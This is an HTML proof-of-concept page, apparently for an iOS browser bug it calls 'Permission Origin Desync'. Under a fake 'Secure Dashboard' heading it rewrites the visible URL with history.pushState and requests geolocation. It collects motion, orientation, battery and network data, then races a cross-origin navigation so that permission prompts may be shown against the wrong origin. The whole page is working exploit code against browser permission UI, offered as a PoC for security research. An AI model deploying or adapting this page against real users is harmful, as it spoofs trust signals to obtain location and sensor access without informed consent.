<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>iOS Permission Origin Desync – Related APIs PoC</title>
<meta name="viewport" content="width=device-width,initial-scale=1">

<style>
body {
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
  margin:0;
}
#box {
  max-width:480px;
  margin:70px auto;
  background:#fff;
  padding:22px;
  border-radius:14px;
  box-shadow:0 18px 50px rgba(0,0,0,.25);
}
button {
  padding:12px 16px;
  font-size:15px;
  border:none;
  border-radius:10px;
  background:#007aff;
  color:#fff;
}
pre {
  margin-top:14px;
  background:#111;
  color:#0f0;
  padding:12px;
  font-size:12px;
  max-height:260px;
  overflow:auto;
}
.small { color:#666; font-size:12px; }
</style>
</head>

<body>

<div id="box">
  <h3>Secure Dashboard</h3>
  <p class="small">Trusted origin required</p>

  <button id="start">Start PoC</button>
  <pre id="log"></pre>
</div>

<script>
const log = m => {
  const l = document.getElementById('log');
  l.textContent += m + "\n";
};

document.getElementById('start').onclick = async () => {
  log("== START ==");
  
  /* 1️⃣ Fake trusted URL */
  history.pushState({}, '', '/trusted');

  log("Visible URL changed to /trusted");

  /* 2️⃣ GEOLOCATION (core bug) */
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      () => log("Geolocation: SUCCESS"),
      () => log("Geolocation: DENIED")
    );
  }

  /* 3️⃣ DEVICE ORIENTATION */
  window.addEventListener('deviceorientation', e => {
    log("Orientation event fired");
  }, { once:true });

  /* 4️⃣ DEVICE MOTION */
  window.addEventListener('devicemotion', () => {
    log("Motion event fired");
  }, { once:true });

  /* 5️⃣ BATTERY (async system info) */
  if (navigator.getBattery) {
    const b = await navigator.getBattery();
    log("Battery level: " + Math.round(b.level * 100) + "%");
  }

  /* 6️⃣ NETWORK INFO */
  if (navigator.connection) {
    log("Network type: " + navigator.connection.effectiveType);
  }

  /* 7️⃣ VIBRATION (system mediated) */
  navigator.vibrate?.(100);
  log("Vibration requested");

  /* 8️⃣ PERMISSION STATE OBSERVATION */
  if (navigator.permissions) {
    try {
      const p = await navigator.permissions.query({ name:'geolocation' });
      log("Permission[geolocation]: " + p.state);
    } catch {}
  }

  /* 9️⃣ NAVIGATION RACE */
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        log("Navigating cross-origin…");
        location.href = 'https://google.com:9090';
      }, 60);
    });
  });
};
</script>

</body>
</html>
